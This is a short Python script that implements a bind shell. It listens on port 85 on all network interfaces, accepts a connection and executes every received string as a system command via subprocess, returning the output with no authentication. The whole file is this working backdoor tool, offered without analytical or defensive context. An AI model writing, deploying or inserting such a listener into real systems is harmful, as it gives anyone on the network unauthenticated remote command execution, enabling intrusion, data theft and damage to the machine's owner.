import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 85       # Port to listen on

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"[*] Listening on {HOST}:{PORT}")

client_socket, client_address = server_socket.accept()
print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

while True:
    try:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())
    except ConnectionResetError:
        print("[*] Client disconnected.")
        break

client_socket.close()
server_socket.close()
